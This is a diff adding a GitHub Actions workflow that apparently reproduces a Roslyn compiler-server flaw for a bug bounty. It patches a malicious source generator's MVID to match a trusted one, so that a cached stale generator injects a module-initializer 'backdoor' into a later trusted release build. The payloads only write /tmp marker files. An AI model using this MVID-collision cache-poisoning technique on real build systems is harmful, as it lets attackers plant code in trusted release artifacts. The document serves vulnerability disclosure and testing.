@@ -1,0 +1,279 @@
+name: roslyn-generator-mvid-artifact-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/roslyn-generator-mvid-artifact-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Build benign trusted and attacker generator fixtures
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/roslyn-generator-fixtures /tmp/reused-release-workspace
+          rm -f /tmp/GENERATOR_EXECUTION_MARKER /tmp/PERSISTENT_ARTIFACT_MARKER
+          mkdir -p /tmp/roslyn-generator-fixtures/{trusted,malicious,reader}
+
+          cat > /tmp/roslyn-generator-fixtures/trusted/CollisionGenerator.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>netstandard2.0</TargetFramework>
+              <AssemblyName>CollisionGenerator</AssemblyName>
+              <Deterministic>true</Deterministic>
+              <DebugType>none</DebugType>
+              <LangVersion>latest</LangVersion>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis" HintPath="$(MSBuildSDKsPath)/../Roslyn/bincore/Microsoft.CodeAnalysis.dll" Private="false" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cp /tmp/roslyn-generator-fixtures/trusted/CollisionGenerator.csproj /tmp/roslyn-generator-fixtures/malicious/CollisionGenerator.csproj
+
+          cat > /tmp/roslyn-generator-fixtures/trusted/CollisionGenerator.cs <<'EOF'
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Text;
+          using System.Text;
+
+          [Generator]
+          public sealed class CollisionGenerator : ISourceGenerator
+          {
+              public void Initialize(GeneratorInitializationContext context) { }
+
+              public void Execute(GeneratorExecutionContext context)
+              {
+                  context.AddSource(
+                      "TrustedGenerated.g.cs",
+                      SourceText.From(
+                          "internal static class TrustedGenerated { public const string Value = \"TRUSTED_GENERATOR_OUTPUT\"; }",
+                          Encoding.UTF8));
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-generator-fixtures/malicious/CollisionGenerator.cs <<'EOF'
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Text;
+          using System.IO;
+          using System.Text;
+
+          [Generator]
+          public sealed class CollisionGenerator : ISourceGenerator
+          {
+              public void Initialize(GeneratorInitializationContext context) { }
+
+              public void Execute(GeneratorExecutionContext context)
+              {
+                  File.WriteAllText("/tmp/GENERATOR_EXECUTION_MARKER", context.Compilation.AssemblyName ?? "<null>");
+                  context.AddSource(
+                      "InjectedPersistentBackdoor.g.cs",
+                      SourceText.From(
+                          @"using System.IO;
+using System.Runtime.CompilerServices;
+internal static class InjectedPersistentBackdoor
+{
+    [ModuleInitializer]
+    internal static void Run()
+        => File.WriteAllText(""/tmp/PERSISTENT_ARTIFACT_MARKER"", ""ATTACKER_GENERATED_CODE_EXECUTED_FROM_TRUSTED_ARTIFACT"");
+}",
+                          Encoding.UTF8));
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-generator-fixtures/reader/MvidReader.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework><OutputType>Exe</OutputType></PropertyGroup>
+          </Project>
+          EOF
+          cat > /tmp/roslyn-generator-fixtures/reader/Program.cs <<'EOF'
+          using System;
+          using System.IO;
+          using System.Reflection.Metadata;
+          using System.Reflection.PortableExecutable;
+          using var s = File.OpenRead(args[0]);
+          using var pe = new PEReader(s);
+          var md = pe.GetMetadataReader();
+          Console.WriteLine(Convert.ToHexString(md.GetGuid(md.GetModuleDefinition().Mvid).ToByteArray()));
+          EOF
+
+          dotnet build /tmp/roslyn-generator-fixtures/trusted/CollisionGenerator.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-generator-fixtures/malicious/CollisionGenerator.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-generator-fixtures/reader/MvidReader.csproj -c Release -v:q
+
+          trusted=/tmp/roslyn-generator-fixtures/trusted/bin/Release/netstandard2.0/CollisionGenerator.dll
+          malicious=/tmp/roslyn-generator-fixtures/malicious/bin/Release/netstandard2.0/CollisionGenerator.dll
+          reader=/tmp/roslyn-generator-fixtures/reader/bin/Release/net10.0/MvidReader.dll
+          cp "$malicious" /tmp/roslyn-generator-fixtures/malicious-unpatched.dll
+
+          th=$(dotnet "$reader" "$trusted")
+          mh=$(dotnet "$reader" "$malicious")
+          python3 - "$malicious" "$mh" "$th" <<'PY'
+          from pathlib import Path
+          import sys
+          p=Path(sys.argv[1]); old=bytes.fromhex(sys.argv[2]); new=bytes.fromhex(sys.argv[3])
+          b=bytearray(p.read_bytes())
+          assert b.count(old)==1, b.count(old)
+          i=b.index(old); b[i:i+16]=new; p.write_bytes(b)
+          PY
+
+          test "$(dotnet "$reader" "$malicious")" = "$th"
+          cp "$malicious" /tmp/roslyn-generator-fixtures/malicious-patched.dll
+          echo "TRUSTED_GENERATOR_MVID=$th"
+          echo "PATCHED_ATTACKER_GENERATOR_MVID=$(dotnet "$reader" "$malicious")"
+          sha256sum "$trusted" /tmp/roslyn-generator-fixtures/malicious-patched.dll
+
+      - name: Negative control - different MVID does not contaminate later trusted artifact
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -rf /tmp/reused-release-workspace
+          rm -f /tmp/GENERATOR_EXECUTION_MARKER /tmp/PERSISTENT_ARTIFACT_MARKER /tmp/generator-control.log
+          mkdir -p /tmp/reused-release-workspace/tools
+          cp /tmp/roslyn-generator-fixtures/malicious-unpatched.dll /tmp/reused-release-workspace/tools/CollisionGenerator.dll
+
+          cat > /tmp/reused-release-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Poison</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionGenerator.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("POISON_CONTROL");' > /tmp/reused-release-workspace/Program.cs
+          export RoslynCommandLineLogFile=/tmp/generator-control.log
+          dotnet build /tmp/reused-release-workspace/App.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+          test ! -e /tmp/GENERATOR_EXECUTION_MARKER
+
+          rm -rf /tmp/reused-release-workspace
+          mkdir -p /tmp/reused-release-workspace/tools
+          cp /tmp/roslyn-generator-fixtures/trusted/bin/Release/netstandard2.0/CollisionGenerator.dll /tmp/reused-release-workspace/tools/CollisionGenerator.dll
+          cat > /tmp/reused-release-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Trusted</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionGenerator.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("TRUSTED_CONTROL");' > /tmp/reused-release-workspace/Program.cs
+          dotnet build /tmp/reused-release-workspace/App.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          dotnet /tmp/reused-release-workspace/bin/Release/net10.0/Trusted.dll
+
+          test ! -e /tmp/PERSISTENT_ARTIFACT_MARKER
+          echo "DIFFERENT_MVID_ARTIFACT_CONTROL=PASS"
+          grep -E 'MVID|Rejected|ID=VBCSCompiler .*Begin Analyzer Consistency' /tmp/generator-control.log || true
+
+      - name: Attack - same-MVID stale generator injects persistent code into later trusted artifact
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -rf /tmp/reused-release-workspace
+          rm -f /tmp/GENERATOR_EXECUTION_MARKER /tmp/PERSISTENT_ARTIFACT_MARKER /tmp/generator-attack.log
+          mkdir -p /tmp/reused-release-workspace/tools
+          cp /tmp/roslyn-generator-fixtures/malicious-patched.dll /tmp/reused-release-workspace/tools/CollisionGenerator.dll
+
+          cat > /tmp/reused-release-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Poison</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionGenerator.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("UNTRUSTED_PR_BUILD");' > /tmp/reused-release-workspace/Program.cs
+          export RoslynCommandLineLogFile=/tmp/generator-attack.log
+
+          dotnet build /tmp/reused-release-workspace/App.csproj -c Release -t:Rebuild             -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+
+          test ! -e /tmp/GENERATOR_EXECUTION_MARKER
+          test ! -e /tmp/PERSISTENT_ARTIFACT_MARKER
+          echo "UNTRUSTED_PR_GENERATOR_EXECUTION=BLOCKED"
+
+          rm -rf /tmp/reused-release-workspace
+          test ! -e /tmp/reused-release-workspace
+          echo "UNTRUSTED_PR_WORKSPACE_FULLY_REMOVED=YES"
+
+          mkdir -p /tmp/reused-release-workspace/tools
+          cp /tmp/roslyn-generator-fixtures/trusted/bin/Release/netstandard2.0/CollisionGenerator.dll /tmp/reused-release-workspace/tools/CollisionGenerator.dll
+
+          cat > /tmp/reused-release-workspace/App.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Trusted</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionGenerator.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("TRUSTED_RELEASE_BUILD");' > /tmp/reused-release-workspace/Program.cs
+
+          cmp /tmp/roslyn-generator-fixtures/trusted/bin/Release/netstandard2.0/CollisionGenerator.dll /tmp/reused-release-workspace/tools/CollisionGenerator.dll
+          echo "TRUSTED_GENERATOR_ON_DISK_BEFORE_RELEASE_BUILD=PRISTINE"
+
+          dotnet build /tmp/reused-release-workspace/App.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+          test -e /tmp/GENERATOR_EXECUTION_MARKER
+          grep -q '^Trusted$' /tmp/GENERATOR_EXECUTION_MARKER
+          echo "STALE_ATTACKER_GENERATOR_EXECUTED_DURING_TRUSTED_RELEASE_BUILD=CONFIRMED"
+
+          # Kill the compiler server before executing the artifact. If the next marker appears,
+          # the attacker-generated code is embedded in the trusted output, not dependent on VBCSCompiler.
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -f /tmp/PERSISTENT_ARTIFACT_MARKER
+          dotnet /tmp/reused-release-workspace/bin/Release/net10.0/Trusted.dll
+
+          test -e /tmp/PERSISTENT_ARTIFACT_MARKER
+          grep -q 'ATTACKER_GENERATED_CODE_EXECUTED_FROM_TRUSTED_ARTIFACT' /tmp/PERSISTENT_ARTIFACT_MARKER
+
+          echo "SAME_MVID_SOURCE_GENERATOR_BYPASS=CONFIRMED"
+          echo "TRUSTED_RELEASE_ARTIFACT_TAMPERING=CONFIRMED"
+          echo "ATTACKER_CODE_PERSISTS_AFTER_COMPILER_SERVER_SHUTDOWN=CONFIRMED"
+          echo "TRUSTED_ARTIFACT_RUNTIME_CODE_EXECUTION=CONFIRMED"
+          cat /tmp/PERSISTENT_ARTIFACT_MARKER
+          echo "SAME_SERVER_EVIDENCE:"
+          grep -E 'ID=VBCSCompiler .*Begin Analyzer Consistency' /tmp/generator-attack.log || true
